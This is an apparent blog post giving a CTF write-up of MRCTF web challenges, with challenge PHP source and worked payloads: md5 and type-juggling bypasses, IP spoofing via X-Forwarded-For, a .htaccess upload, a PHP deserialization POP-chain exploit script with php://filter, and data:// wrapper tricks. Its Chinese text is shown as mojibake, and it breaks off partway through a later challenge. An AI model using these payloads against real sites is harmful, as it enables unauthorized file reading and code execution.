<!doctype html><html lang=zh>
<head><meta http-equiv=content-type content="text/html" charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
<meta name=viewport content="width=device-width,initial-scale=1">
<link rel=stylesheet href="/css/main.min.603bdac5a514a018c8a598608c9559e9356dee22c6203eb4ba7ad06c438010c7.css" integrity="sha256-YDvaxaUUoBjIpZhgjJVZ6TVt7iLGID60unrQbEOAEMc=">
<link rel=preconnect href=https://fonts.googleapis.com>
<link rel=preconnect href=https://fonts.gstatic.com crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Fira+Code&family=Lora&display=swap" rel=stylesheet>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css>
<script src=https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js></script>
<script src=https://cdn.jsdelivr.net/npm/code-line></script><title>MRCTF Web éƒ¨åˆ†é¢˜è§£</title>
</head>
<body class="flex flex-col bg-gray-100">
<div class="flex my-8 font-serif">
<div class="flex-auto w-1/3">
<div class="w-64 h-full mr-2 ml-auto">
<div class=mb-8><div class="border rounded-lg shadow-md">
<div class="h-32 flex rounded-t-lg text-white" style=background-image:url(/images/background-1.jpg)>
<div class=m-auto>
<div class="text-center font-serif text-3xl my-2"><a href=/>Noth</a></div>
<div class="text-center font-serif">å»ç å¤´æ•´ç‚¹è–¯æ¡</div>
</div>
</div>
<nav class="rounded-b-lg bg-white">
<ul class="py-2 ml-8">
<li class="my-2 content-center">
<a href=/ class=hover:text-red-300><i class="fas fa-home"></i>&nbsp;&nbsp;&nbsp;ä¸»é¡µ</a>
</li>
<li class="my-2 content-center">
<a href=/metapages/archive/ class=hover:text-red-300><i class="fas fa-scroll"></i>&nbsp;&nbsp;å½’æ¡£</a>
</li>
<li class="my-2 content-center">
<a href=/categories/ class=hover:text-red-300><i class="fas fa-th"></i>&nbsp;&nbsp;&nbsp;åˆ†ç±»</a>
</li>
<li class="my-2 content-center">
<a href=/tags/ class=hover:text-red-300><i class="fas fa-tags"></i>&nbsp;&nbsp;æ ‡ç­¾</a>
</li>
<li class="my-2 content-center">
<a href=/metapages/link/ class=hover:text-red-300><i class="fas fa-link"></i>&nbsp;&nbsp;&nbsp;é“¾æ¥</a>
</li>
<li class="my-2 content-center">
<a href=/metapages/message/ class=hover:text-red-300><i class="fas fa-comment-alt"></i>&nbsp;&nbsp;&nbsp;ç•™è¨€</a>
</li>
</ul>
</nav>
</div></div>
<div class="sticky top-2">
<div class=toc>
<nav id=TableOfContents></nav>
</div>
</div>
</div>
</div>
<div class="flex-auto w-2/3">
<div class="w-200 border rounded-lg bg-white ml-2 mr-auto px-4">
<h1 class="font-serif text-4xl text-center mt-8 mb-2">MRCTF Web éƒ¨åˆ†é¢˜è§£</h1>
<div class="text-right text-gray-500 mr-20">
<span>
Mar. 30, 2020 |
<i class="far fa-bookmark"></i>
</span>
</div>
<div class="content px-6 mb-8">
<p>éƒ¨åˆ† MRCTF æ–°ç”Ÿèµ› Web æ–¹å‘çš„ Writeup</p>
<h1 id=ez_bypass>ez_bypass</h1>
<p>é¢˜ç›®ç»™å‡ºäº†æºç ï¼š</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#66d9ef>include</span> <span style=color:#e6db74>&#39;flag.php&#39;</span>;
$flag<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}&#39;</span>;
<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;gg&#39;</span>])<span style=color:#f92672>&amp;&amp;</span><span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;id&#39;</span>])) {
    $id<span style=color:#f92672>=</span>$_GET[<span style=color:#e6db74>&#39;id&#39;</span>];
    $gg<span style=color:#f92672>=</span>$_GET[<span style=color:#e6db74>&#39;gg&#39;</span>];
    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>md5</span>($id) <span style=color:#f92672>===</span> <span style=color:#a6e22e>md5</span>($gg) <span style=color:#f92672>&amp;&amp;</span> $id <span style=color:#f92672>!==</span> $gg) {
        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;You got the first step&#39;</span>;
        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;passwd&#39;</span>])) {
            $passwd<span style=color:#f92672>=</span>$_POST[<span style=color:#e6db74>&#39;passwd&#39;</span>];
            <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>is_numeric</span>($passwd))
            {
                 <span style=color:#66d9ef>if</span>($passwd<span style=color:#f92672>==</span><span style=color:#ae81ff>1234567</span>)
                 {
                     <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;Good Job!&#39;</span>;
                     <span style=color:#a6e22e>highlight_file</span>(<span style=color:#e6db74>&#39;flag.php&#39;</span>);
                     <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;By Retr_0&#39;</span>);
                 }
                 <span style=color:#66d9ef>else</span>
                 {
                     <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;can you think twice??&#34;</span>;
                 }
            }
            <span style=color:#66d9ef>else</span>{
                <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;You can not get it !&#39;</span>;
            }

        }
        <span style=color:#66d9ef>else</span>{
            <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;only one way to get the flag&#39;</span>);
        }
}
    <span style=color:#66d9ef>else</span> {
        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;You are not a real hacker!&#34;</span>;
    }
}
<span style=color:#66d9ef>else</span>{
    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;Please input first&#39;</span>);
}
}<span style=color:#a6e22e>Please</span> <span style=color:#a6e22e>input</span> <span style=color:#a6e22e>first</span>
</code></pre></div><p>é¦–å…ˆè¦ç»•è¿‡<code>md5($id) === md5($gg) && $id !== $gg</code>ï¼Œæ ¹æ® md5() çš„ç‰¹æ€§ï¼Œä¼ å…¥å‚æ•°ä¸ºæ•°ç»„çš„è¯ä¼šè¿”å›0ï¼Œé‚£ä¹ˆä¼ å…¥è¿™ä¸¤ä¸ªå‚æ•°å‡ä¸ºæ•°ç»„å°±è¡Œäº†ï¼›
ä¹‹åæ˜¯`is_numeric($passwd) && $passwd==1234567)ï¼Œé‚£ä¹ˆåˆ©ç”¨çš„æ˜¯ PHP å¼±ç±»å‹çš„æ¯”è¾ƒç‰¹æ€§ï¼Œä¼ å…¥ä¸€ä¸ªä»¥1234567å¼€å¤´çš„å­—ç¬¦ä¸²å°±è¡Œã€‚
<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/mrctf/bypass.png alt=bypass></p>
<p>è¿”å›flagã€‚</p>
<h1 id=pywebsite>PYwebsite</h1>
<p>æç¤ºèŠ± 66 ä¹° flag å°±è¡Œï¼Œé‚£å°±æ”¯ä»˜å‘—ï¼ˆæ‰æ€ªï¼ï¼‰ã€‚æŸ¥çœ‹æºç ï¼š</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>validate</span>(){
      <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>code</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>document</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#34;vcode&#34;</span>)<span style=color:#f92672>.</span><span style=color:#a6e22e>value</span>;
      <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>code</span> <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;&#34;</span>){
        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>hex_md5</span>(<span style=color:#a6e22e>code</span>) <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;0cd4da0223c0b280829dc3ea458d655c&#34;</span>){
          <span style=color:#a6e22e>alert</span>(<span style=color:#e6db74>&#34;æ‚¨é€šè¿‡äº†éªŒè¯ï¼&#34;</span>);
          <span style=color:#a6e22e>window</span><span style=color:#f92672>.</span><span style=color:#a6e22e>location</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;./flag.php&#34;</span>
        }<span style=color:#66d9ef>else</span>{
          <span style=color:#a6e22e>alert</span>(<span style=color:#e6db74>&#34;ä½ çš„æˆæƒç ä¸æ­£ç¡®ï¼&#34;</span>);
        }
      }<span style=color:#66d9ef>else</span>{
        <span style=color:#a6e22e>alert</span>(<span style=color:#e6db74>&#34;è¯·è¾“å…¥æˆæƒç &#34;</span>);
      } 
    }
</code></pre></div><p>å¥½åƒæ˜¯è®¾ç½®äº†ä¸€ä¸ªéªŒè¯ï¼Œä½†æ˜¯æ²¡å¿…è¦å»è§£å¯†ï¼Œå®Œå…¨å¯ä»¥ç›´æ¥è®¿é—® flag.phpã€‚
ä½†æ˜¯è¿˜æ²¡å®Œï¼Œä¸è¿‡æç¤ºè®°å½•äº†IPï¼Œè€Œä¸”<code>éªŒè¯é€»è¾‘æ˜¯åœ¨åç«¯çš„ï¼Œé™¤äº†è´­ä¹°è€…å’Œæˆ‘è‡ªå·±ï¼Œæ²¡æœ‰äººå¯ä»¥çœ‹åˆ°flag</code>ï¼Œé‚£å°±é€šè¿‡IPä¼ªé€ æœ¬åœ°ç™»é™†å‘—ï¼Œä½¿ç”¨ XFF å¤´å³å¯ã€‚
<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/mrctf/pywebsite.png alt=pywebsite.php></p>
<p>è¿”å›äº†flagã€‚</p>
<h1 id=ä½ ä¼ ä½ å‘¢>ä½ ä¼ ä½ ğŸå‘¢</h1>
<p>æ–‡ä»¶ä¸Šä¼ ï¼Œå…ˆå°è¯•äº†ä¸€ä¸‹ï¼Œåº”è¯¥æ˜¯åœ¨åç«¯å¯¹æ–‡ä»¶çš„æ‰©å±•åè¿›è¡Œäº†æ£€æŸ¥ï¼Œåªè¦æ˜¯ <code>.ph*</code> çš„éƒ½ä¼šæŠ¥é”™ã€‚
ä¸€å¼€å§‹çœ‹åˆ°å“åº”å¤´ä¸­æœ‰ <code>Server: nginx</code>ï¼Œäºæ˜¯æƒ³åŠæ³•ç»•è¿‡ï¼Œä½†æ˜¯æ— æœã€‚ä½†æ˜¯å½“æˆ‘ä½¿ç”¨å°è¯•æœ‰æ²¡æœ‰å…¶ä»–é¡µé¢çš„æ—¶å€™å‘ç°è¿”å›çš„é¡µé¢æ˜¯ Apacheã€‚
<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/mrctf/upload.png alt=upload>
è¿˜æœ‰è¿™å±‚ä¼ªè£…ï¼é‚£å°±å…ˆä¼ ä¸ª .htaccess è¯•è¯•ã€‚
<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/mrctf/upload2.png alt=upload2>
æˆåŠŸä¸Šä¼ ã€‚æ¥ä¸‹æ¥ä¼ ä¸ªæœ¨é©¬è¯»å–flagå°±è¡Œäº†ã€‚</p>
<h1 id=ezpop>Ezpop</h1>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
<span style=color:#75715e>//flag is in flag.php
</span><span style=color:#75715e>//WTF IS THIS?
</span><span style=color:#75715e>//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
</span><span style=color:#75715e>//And Crack It!
</span><span style=color:#75715e></span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Modifier</span> {
    <span style=color:#66d9ef>protected</span>  $var;
    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>append</span>($value){
        <span style=color:#66d9ef>include</span>($value);
    }
    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __invoke(){
        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>append</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>var</span>);
    }
}

<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Show</span>{
    <span style=color:#66d9ef>public</span> $source;
    <span style=color:#66d9ef>public</span> $str;
    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __construct($file<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;index.php&#39;</span>){
        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span> <span style=color:#f92672>=</span> $file;
        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;Welcome to &#39;</span><span style=color:#f92672>.</span>$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#34;&lt;br&gt;&#34;</span>;
    }
    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __toString(){
        <span style=color:#66d9ef>return</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>str</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span>;
    }

    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __wakeup(){
        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/gopher|http|file|ftp|https|dict|\.\./i&#34;</span>, $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span>)) {
            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;hacker&#34;</span>;
            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;index.php&#34;</span>;
        }
    }
}

<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Test</span>{
    <span style=color:#66d9ef>public</span> $p;
    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __construct(){
        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>p</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>();
    }

    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __get($key){
        $function <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>p</span>;
        <span style=color:#66d9ef>return</span> $function();
    }
}

<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;pop&#39;</span>])){
    <span style=color:#f92672>@</span><span style=color:#a6e22e>unserialize</span>($_GET[<span style=color:#e6db74>&#39;pop&#39;</span>]);
}
<span style=color:#66d9ef>else</span>{
    $a<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Show</span>;
    <span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>);
}
</code></pre></div><p>PHPååºåˆ—åŒ–ï¼Œæ„é€  POP é“¾ã€‚
æ³¨æ„åˆ° include å¯ä»¥åŒ…å«æ–‡ä»¶ï¼Œé‚£ä¹ˆæƒ³åŠæ³•è°ƒç”¨ <strong>Modifer</strong> ä¸­çš„ <em>append</em> æ–¹æ³•ï¼Œè¿›è€Œå¾—å‡ºè°ƒç”¨ <em>__invoke</em> é­”æœ¯æ–¹æ³•ã€‚
å°è¯•ä»¥å‡½æ•°æ–¹å¼è°ƒç”¨å¯¹è±¡æ—¶ï¼Œ<em>__invode</em> ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ï¼Œé‚£ä¹ˆå¾€ä¸‹æ‰¾ï¼Œå‘ç° <strong>Test</strong> ä¼šä»¥å‡½æ•°å½¢å¼è°ƒç”¨å˜é‡ pï¼Œé‚£ä¹ˆå¯ä»¥æ„é€  <code>p=Modifer</code>ï¼ŒåŒæ—¶è¿˜è¦å…ˆåŠæ³•è°ƒç”¨ <em>__get</em> é­”æœ¯æ–¹æ³•ã€‚
è¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼æ—¶ï¼Œ<em>__get()</em> ä¼šè¢«è°ƒç”¨ã€‚å¯ä»¥çœ‹åˆ°ï¼Œ<strong>Show</strong> ä¸­çš„ <em>__toString</em> ä¼šè°ƒç”¨ <em>str->source</em> ï¼Œå¦‚æœ <em>str</em> æ—¶ <strong>Test</strong>ï¼Œå½“ <em>source</em> ä¸å­˜åœ¨æ—¶ï¼Œå°±ä¼šè°ƒç”¨ <em>__get</em> æ–¹æ³•ã€‚å› æ­¤æƒ³åŠæ³•è°ƒç”¨ <em>__toString</em> æ–¹æ³•ã€‚
å¯ä»¥çœ‹åˆ° <strong>Show</strong> ä¸­çš„ <em>__wakeup</em> ä¼šä½¿ç”¨ <em>preg_match</em> å°† <em>source</em> ä½œä¸ºå­—ç¬¦ä¸²æ¯”è¾ƒï¼Œé‚£ä¹ˆå¦‚æœ <em>source</em> æ˜¯ <strong>Show</strong> çš„è¯ï¼Œå°±å¯ä»¥è°ƒç”¨ <em>__toString</em> æ–¹æ³•ã€‚
è€Œååºåˆ—åŒ–çš„æ—¶å€™ï¼Œ<em>__wakeup</em> ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ï¼Œå› æ­¤æœ€ç»ˆååºåˆ—åŒ–çš„å¯¹è±¡æ˜¯ <strong>Show</strong>ã€‚</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Modifier</span>{
    <span style=color:#66d9ef>protected</span>  $var<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;php://filter/convert.base64-encode/resource=flag.php&#39;</span>;
}

<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Show</span>{
    <span style=color:#66d9ef>public</span> $source;
    <span style=color:#66d9ef>public</span> $str;
}

<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Test</span>{
    <span style=color:#66d9ef>public</span> $p;
    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __construct(){
        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>p</span><span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Modifier</span>();
    }
}

$a <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Show</span>();
$a<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>str</span><span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Test</span>();
$b <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Show</span>();
$b<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span><span style=color:#f92672>=</span> $a;
<span style=color:#75715e>// var_dump($b);
</span><span style=color:#75715e></span><span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>urlencode</span>(<span style=color:#a6e22e>serialize</span>($b));
</code></pre></div><p>ç”Ÿæˆçš„payloadä½œä¸ºå‚æ•°å€¼ï¼Œå³å¯è¿”å› <em>flag.php</em> çš„base64 ç¼–ç ï¼Œå¯¹å…¶è§£ç å³å¯è·å¾—flagã€‚</p>
<h1 id=å¥—å¨ƒ>å¥—å¨ƒ</h1>
<p>æŸ¥çœ‹æºç ï¼Œå‘ç°æç¤ºç¬¬ä¸€æ¬¡å±‚ï¼š</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#75715e>//1st
</span><span style=color:#75715e></span>$query <span style=color:#f92672>=</span> $_SERVER[<span style=color:#e6db74>&#39;QUERY_STRING&#39;</span>];

 <span style=color:#66d9ef>if</span>( <span style=color:#a6e22e>substr_count</span>($query, <span style=color:#e6db74>&#39;_&#39;</span>) <span style=color:#f92672>!==</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>||</span> <span style=color:#a6e22e>substr_count</span>($query, <span style=color:#e6db74>&#39;%5f&#39;</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span> ){
    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;Y0u are So cutE!&#39;</span>);
}
 <span style=color:#66d9ef>if</span>($_GET[<span style=color:#e6db74>&#39;b_u_p_t&#39;</span>] <span style=color:#f92672>!==</span> <span style=color:#e6db74>&#39;23333&#39;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/^23333$/&#39;</span>, $_GET[<span style=color:#e6db74>&#39;b_u_p_t&#39;</span>])){
    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;you are going to the next ~&#34;</span>;
}
</code></pre></div><p>é‡ç‚¹æ˜¯ç»•è¿‡ç¬¬ä¸€ä¸ªæ¯”è¾ƒï¼Œè¦æ±‚ä¸èƒ½å«æœ‰ä¸‹åˆ’çº¿ã€‚è¿™é‡Œä½¿ç”¨çš„ PHP çš„å¯¹å­—ç¬¦ä¸²è½¬æ¢æˆå˜é‡çš„ç‰¹æ€§ã€‚
ç”±äº PHP å˜é‡ä¸å…è®¸å«æœ‰ç‚¹å’Œç©ºæ ¼ï¼Œå› æ­¤ PHP åœ¨å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå˜é‡çš„æ—¶å€™ä¼šå°†ç‚¹å’Œç©ºæ ¼è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼Œè¿™é‡Œå°±æ˜¯åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œä¼ é€’å‚æ•°ï¼š
<code>?b.u.p.t=23333%0a</code>
æç¤ºflag åœ¨ï¼Œå…ˆè®¿é—®ä¸€ä¸‹ secrettw.phpã€‚
<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/mrctf/jsfuck.png alt=jsfuck>
é¦–å…ˆæ˜¯æç¤º IP ä¸æ­£ç¡®ï¼Œå…¶æ¬¡æŸ¥çœ‹æºç å¯ä»¥çœ‹åˆ° jsFuck çš„ä»£ç ï¼Œå°†å…¶ç¿»è¯‘ä¹‹åæ˜¯è¯´ " POST me Merak &ldquo;ã€‚
é‚£ä¹ˆç›®æ ‡å°±æ˜ç¡®äº†ï¼Œä¼ªé€ IPï¼ŒåŒæ—¶æ·»åŠ ä¸€ä¸ª POST å‚æ•°ã€‚
<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/mrctf/post.png alt=post>
è¿”å›äº†æºç ï¼š</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span> 
<span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>); 
<span style=color:#66d9ef>include</span> <span style=color:#e6db74>&#39;takeip.php&#39;</span>;
<span style=color:#a6e22e>ini_set</span>(<span style=color:#e6db74>&#39;open_basedir&#39;</span>,<span style=color:#e6db74>&#39;.&#39;</span>); 
<span style=color:#66d9ef>include</span> <span style=color:#e6db74>&#39;flag.php&#39;</span>;

<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;Merak&#39;</span>])){ 
    <span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>); 
    <span style=color:#66d9ef>die</span>(); 
} 


<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>change</span>($v){ 
    $v <span style=color:#f92672>=</span> <span style=color:#a6e22e>base64_decode</span>($v); 
    $re <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>; 
    <span style=color:#66d9ef>for</span>($i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>;$i<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>strlen</span>($v);$i<span style=color:#f92672>++</span>){ 
        $re <span style=color:#f92672>.=</span> <span style=color:#a6e22e>chr</span> ( <span style=color:#a6e22e>ord</span> ($v[$i]) <span style=color:#f92672>+</span> $i<span style=color:#f92672>*</span><span style=color:#ae81ff>2</span> ); 
    } 
    <span style=color:#66d9ef>return</span> $re; 
}
<span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;Local access only!&#39;</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#34;&lt;br/&gt;&#34;</span>;
$ip <span style=color:#f92672>=</span> <span style=color:#a6e22e>getIp</span>();
<span style=color:#66d9ef>if</span>($ip<span style=color:#f92672>!=</span><span style=color:#e6db74>&#39;127.0.0.1&#39;</span>)
<span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Sorry,you don&#39;t have permission!  Your ip is :&#34;</span><span style=color:#f92672>.</span>$ip;
<span style=color:#66d9ef>if</span>($ip <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;127.0.0.1&#39;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>file_get_contents</span>($_GET[<span style=color:#e6db74>&#39;2333&#39;</span>]) <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;todat is a happy day&#39;</span> ){
<span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Your REQUEST is:&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>change</span>($_GET[<span style=color:#e6db74>&#39;file&#39;</span>]);
<span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>file_get_contents</span>(<span style=color:#a6e22e>change</span>($_GET[<span style=color:#e6db74>&#39;file&#39;</span>])); }
<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010> 
</span></code></pre></div><p>ç„¶åè¿™é‡Œåˆæ˜¯éªŒè¯ä¸¤ä¸ªä¸œè¥¿ï¼Œé¦–å…ˆæ˜¯è¯»å– 2333 æ–‡ä»¶å†…å®¹ï¼Œéœ€è¦ç­‰äº &lsquo;todat is a happy day&rsquo;ï¼Œä¹‹åæ˜¯è¯·æ±‚æ–‡ä»¶ï¼Œä½†æ˜¯éœ€è¦å¯¹å…¶è¿›è¡ŒåŠ å¯†ã€‚
å…ˆè¯´ 2333ï¼Œè¿™ä¸ªå¯ä»¥é€šè¿‡ä¼ªåè®®ç»•è¿‡ï¼š<code>2333=data://text/plain,todat is a happy</code>ï¼›
å…¶æ¬¡æ˜¯fileï¼ŒåŠ å¯†è¿‡ç¨‹å¾ˆç®€å•ï¼Œé€†å‘ä¸€ä¸‹å°±è¡Œï¼š</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>decode</span>($v){
	$re <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;
	<span style=color:#66d9ef>for</span>($i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>;$i<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>strlen</span>($v);$i<span style=color:#f92672>++</span>){
		$re <span style=color:#f92672>.=</span> <span style=color:#a6e22e>chr</span>(<span style=color:#a6e22e>ord</span>($v[$i])<span style=color:#f92672>-</span>$i<span style=color:#f92672>*</span><span style=color:#ae81ff>2</span>);
	}
	$re <span style=color:#f92672>=</span> <span style=color:#a6e22e>base64_encode</span>($re);
	<span style=color:#66d9ef>return</span> $re;
}

<span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>decode</span>(<span style=color:#e6db74>&#34;flag.php&#34;</span>);
<span style=color:#75715e>// ZmpdYSZmXGI=
</span></code></pre></div><p>payloadï¼š<code>data://text/plain,todat%20is%20a%20happy%20day&file=ZmpdYSZmXGI=</code>.
è¿”å›flagåœ¨æ³¨é‡Šé‡Œã€‚</p>
<h1 id=ezaudit>Ezaudit</h1>
<p>å¯ä»¥æ‰«åˆ°ä¸€ä¸ª<strong>www.zip</strong> æ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥æ˜¯ index.php çš„æºç ï¼š
<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/mrctf/ezaudit.png alt=ezaudit></p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span> 
<span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Content-type:text/html; charset=utf-8&#39;</span>);
<span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;login&#39;</span>])){
    $username <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;username&#39;</span>];
    $password <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;password&#39;</span>];
    $Private_key <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;Private_key&#39;</span>];
